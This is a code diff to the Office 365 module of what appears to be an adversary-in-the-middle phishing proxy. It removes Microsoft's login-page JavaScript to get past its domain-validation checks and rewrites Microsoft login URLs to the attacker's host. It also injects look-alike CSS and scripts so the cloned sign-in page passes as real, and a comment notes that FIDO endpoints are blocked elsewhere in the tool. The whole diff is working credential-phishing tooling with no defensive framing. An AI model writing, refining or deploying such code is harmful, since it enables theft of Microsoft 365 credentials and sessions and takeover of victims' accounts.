@@ -946,50 +946,108 @@ class Office365Module(BaseModule):
                     # FIDO endpoint blocking is now handled earlier in _proxy_to_microsoft()
                     # This section now only handles URL rewriting for normal content
                     
-                    # Comprehensive URL rewriting for ALL Microsoft resources
+                    # CREATIVE SOLUTION: Strip JavaScript and use CSS-only Microsoft clone
+                    # Remove all <script> tags to prevent domain validation failures
+                    import re
+                    
+                    # Remove all JavaScript - it's designed to only work on Microsoft domains
+                    content_str = re.sub(r'<script[^>]*>.*?</script>', '', content_str, flags=re.DOTALL | re.IGNORECASE)
+                    content_str = re.sub(r'<script[^>]*/>', '', content_str, flags=re.IGNORECASE)
+                    
+                    # Remove problematic JavaScript references and events
+                    content_str = re.sub(r'\son\w+\s*=\s*["\'][^"\']*["\']', '', content_str, flags=re.IGNORECASE)
+                    content_str = re.sub(r'javascript:[^"\'>\s]*', '', content_str, flags=re.IGNORECASE)
+                    
+                    # Replace Microsoft URLs with our proxy URLs (keep this simple)
                     replacements = [
-                        # Main Microsoft login domains
                         ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
                         ('https://login.live.com/', f'https://{current_host}/proxy/'),
                         ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
                         ('https://account.live.com/', f'https://{current_host}/proxy/'),
                         ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
-                        
-                        # Static resource CDNs and asset domains
-                        ('https://aadcdn.msftauth.net/', f'https://{current_host}/static/aadcdn/'),
-                        ('https://aadcdn.msauth.net/', f'https://{current_host}/static/aadcdn/'),
-                        ('https://logincdn.msftauth.net/', f'https://{current_host}/static/logincdn/'),
-                        ('https://secure.aadcdn.microsoftonline-p.com/', f'https://{current_host}/static/aadcdn/'),
-                        ('https://mem.gfx.ms/', f'https://{current_host}/static/memgfx/'),
-                        ('https://c.s-microsoft.com/', f'https://{current_host}/static/sms/'),
-                        ('https://static2.sharepointonline.com/', f'https://{current_host}/static/spo/'),
-                        ('https://spoprod-a.akamaihd.net/', f'https://{current_host}/static/spo/'),
-                        
-                        # JavaScript/CSS references in quotes
                         ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
                         ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
                         ('"https://login.live.com', f'"https://{current_host}/proxy'),
                         ("'https://login.live.com", f"'https://{current_host}/proxy"),
-                        ('"https://login.microsoft.com', f'"https://{current_host}/proxy'),
-                        ("'https://login.microsoft.com", f"'https://{current_host}/proxy"),
-                        ('"https://aadcdn.msftauth.net', f'"https://{current_host}/static/aadcdn'),
-                        ("'https://aadcdn.msftauth.net", f"'https://{current_host}/static/aadcdn"),
-                        ('"https://logincdn.msftauth.net', f'"https://{current_host}/static/logincdn'),
-                        ("'https://logincdn.msftauth.net", f"'https://{current_host}/static/logincdn"),
-                        
-                        # Relative URLs that might reference Microsoft domains
                         ('//login.microsoftonline.com/', f'//{current_host}/proxy/'),
                         ('//login.live.com/', f'//{current_host}/proxy/'),
-                        ('//login.microsoft.com/', f'//{current_host}/proxy/'),
-                        ('//aadcdn.msftauth.net/', f'//{current_host}/static/aadcdn/'),
-                        ('//logincdn.msftauth.net/', f'//{current_host}/static/logincdn/'),
                     ]
+                    
+                    self.log(f"[AiTM] Stripped JavaScript to prevent domain validation failures")
+                    
+                    # Add custom CSS and functionality to replace the stripped JavaScript
+                    custom_enhancements = '''
+<style>
+/* Enhanced Microsoft-like styling to replace JavaScript functionality */
+.form-group { margin-bottom: 20px; }
+.form-control { 
+    width: 100%; 
+    padding: 12px; 
+    border: 1px solid #ccc; 
+    border-radius: 4px; 
+    font-size: 14px;
+    box-sizing: border-box;
+}
+.form-control:focus { 
+    border-color: #0078d4; 
+    outline: none; 
+    box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
+}
+.btn-primary { 
+    background-color: #0078d4; 
+    border: none; 
+    color: white; 
+    padding: 12px 24px; 
+    border-radius: 4px; 
+    cursor: pointer; 
+    font-size: 14px;
+    width: 100%;
+}
+.btn-primary:hover { background-color: #106ebe; }
+.btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
+
+/* Ensure the page displays properly without JavaScript */
+[style*="display: none"], [style*="display:none"] { display: block !important; }
+.hidden { display: block !important; }
+</style>
+<script>
+// Minimal safe JavaScript for basic form functionality (no domain checks)
+document.addEventListener('DOMContentLoaded', function() {
+    // Auto-focus first input
+    var firstInput = document.querySelector('input[type="email"], input[type="text"], input[type="password"]');
+    if (firstInput) firstInput.focus();
+    
+    // Basic form validation
+    var forms = document.querySelectorAll('form');
+    forms.forEach(function(form) {
+        form.addEventListener('submit', function(e) {
+            var inputs = form.querySelectorAll('input[required]');
+            var valid = true;
+            inputs.forEach(function(input) {
+                if (!input.value.trim()) {
+                    input.style.borderColor = '#d13438';
+                    valid = false;
+                } else {
+                    input.style.borderColor = '#ccc';
+                }
+            });
+            if (!valid) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    });
+});
+</script>'''
+                    
+                    # Insert our enhancements before closing </head> tag
+                    content_str = content_str.replace('</head>', custom_enhancements + '</head>', 1)
                     
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
                     content = content_str.encode('utf-8')
-                    self.log(f"[AiTM] Rewrote {len(replacements)} URL patterns in HTML response")
+                    self.log(f"[AiTM] Enhanced page with custom CSS/JS and rewrote {len(replacements)} URL patterns")
                     
                     # Update Content-Length header since content size may have changed
                     response_headers['Content-Length'] = str(len(content))
